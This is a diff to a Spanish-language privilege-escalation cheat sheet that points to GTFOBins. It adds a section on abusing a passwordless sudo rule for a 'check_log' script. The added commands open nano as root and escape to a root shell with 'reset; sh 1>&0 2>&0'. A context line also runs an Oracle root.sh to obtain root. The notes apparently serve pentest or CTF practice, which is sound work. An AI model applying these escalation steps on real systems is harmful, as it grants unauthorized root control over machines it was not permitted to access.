@@ -16,6 +16,7 @@ A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta c
 
 - **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
 
+
 # Sudoers 
 
 ### Find
@@ -237,4 +238,18 @@ Paso 3:
 
 Paso 4:
 ❯ sudo /opt/oracle/product/21c/dbhomeXE/root.sh        # Ejecutar y ser root
+```
+
+## check_log
+
+```bash 
+❯ sudo -l       
+# Ejecutar el script 'check_log' como root sin password
+	(root) NOPASSWD: /opt/log_inspector/check_log --clean
+
+❯ sudo /opt/log_inspector/check_log --clean   # Al ejecutar el script procede a abrir NANO, por lo que se abusa de NANO
+
+# Dentro de NANO
+❯ ^R^X = (Ctrl + R, Crtl + X)
+❯ reset; sh 1>&0 2>&0
 ```
